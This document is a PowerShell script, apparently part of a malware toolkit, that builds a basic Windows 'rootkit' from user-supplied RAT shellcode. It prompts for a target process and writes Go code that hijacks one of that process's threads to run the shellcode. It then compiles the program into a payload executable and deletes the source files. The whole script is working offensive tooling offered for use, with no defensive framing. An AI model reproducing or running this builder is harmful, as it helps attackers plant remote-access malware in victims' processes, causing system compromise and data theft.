Write-Output "Welcome to the rootkit builder, which generates a basic windows rootkit for your malware."
Write-Output "To get started, extract the shellcode from your RAT generated by the regular builders."
Write-Output "Please note, that this is only a very basic rootkit, and will get caught very easily by most antivirus"
Write-Output ""
Write-Output "This rootkit builder allows a user to enter a process in which"
Write-Output "thread execution hijacking is performed on to execute the shellcode"
Write-Output ""

$hijacked_process = Read-Host "What process would you like to inject the payload into"
   
# Read RSA public key
$shellcode_input = ""
Write-Output "Insert shellcode (terminate with an empty line)"
while ($true) {
    $line = Read-Host
    if ($line -eq "") {
        break
    }
    $shellcode_input += "$line"
}

# Prepare Go packages
go mod init windows_rootkit
go mod tidy
    
    
# Payload builder
$mainGoContent = @"
package main
    
import (
    "fmt"
    "unsafe"
    "windows_rootkit/Code/windows_rootkit"
)
    
func main() {
    // Check if the operating system is Windows
    if !windows_rootkit.CheckOsIsWindows() {
        fmt.Println("This program is designed to run on Windows only.")
        return
    }
    
    // Find the process ID of process to hijack
    pid, err := windows_rootkit.FindProcessIDByName("$hijacked_process")
    if err != nil {
        fmt.Println("Failed to find process ${hijacked_process}:", err)
        return
    }
    
    // Get the thread ID of a thread within the the process to hijack
    tid, err := windows_rootkit.GetThreadIDByProcessID(pid)
    if err != nil {
        fmt.Println("Failed to get thread ID:", err)
        return
    }
    
    // Define shellcode to inject
    var shellcode []byte = []byte{$shellcode_input}
    
    // Hijack the thread
    err = windows_rootkit.HijackThread(pid, tid, uintptr(unsafe.Pointer(&shellcode[0])), shellcode)
    if err != nil {
        fmt.Println("Thread hijack failed:", err)
        return
    }
    
    fmt.Println("Thread hijack successful.")
}
"@

# Save the Go code to main.go file in the Code directory
$mainGoPath = "Code\main.go"
$mainGoContent | Set-Content -Path $mainGoPath -Force

# Compile Go code
$buildOutput = go build -o "Code\main" $mainGoPath 
if ($LASTEXITCODE -eq 0) {
    Write-Output "Go code compiled successfully"
} else {
    Write-Output "Error: Compilation failed"
    Write-Output $buildOutput
    exit 1
}

# Move executable to Payloads directory
$moveOutput = Move-Item -Path "Code\main" -Destination "Payloads\main.exe" -Force 
if ($LASTEXITCODE -eq 0) {
    Write-Output "Executable moved to Payloads directory"
} else {
    Write-Output "Error: Failed to move executable to Payloads directory"
    Write-Output $moveOutput
    exit 1
}

# Delete main.go from Code directory
$deleteOutput = Remove-Item -Path $mainGoPath
if ($LASTEXITCODE -eq 0) {
    Write-Output "Successfully deleted main.go from Code directory"
} else {
    Write-Output "Error: Failed to delete main.go from Code directory"
    Write-Output $deleteOutput
    exit 1
}

# Delete go.mod 
$deleteOutputgoMOD = Remove-Item -Path "go.mod"
if ($LASTEXITCODE -eq 0) {
    Write-Output "Successfully deleted go.mod"
} else {
    Write-Output "Error: Failed to delete go.mod"
    Write-Output $deleteOutputgoMOD
    exit 1
}